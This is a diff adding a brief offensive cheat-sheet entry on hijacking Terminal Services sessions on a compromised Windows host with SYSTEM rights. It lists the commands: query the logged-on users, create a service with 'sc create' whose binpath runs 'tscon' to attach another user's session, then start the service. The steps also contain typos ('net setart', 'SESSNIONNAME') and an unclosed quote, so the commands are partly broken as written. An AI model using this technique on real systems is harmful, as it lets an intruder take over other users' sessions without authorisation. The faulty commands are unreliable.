@@ -1,0 +1,11 @@
+# Hijack TS sessions on a compromised Windows host. Requires SYSTEM.
+
+>query user
+# Look for "SESSIONNAME"
+
+# Create a service using the session name and user ID
+>sc create sesshijack binpath= "cmd.exe /k tscon <ID> /dest:<SESSNIONNAME>
+
+# Results should come back with "[SC] CreateService SUCCESS"
+
+>net setart sesshijack
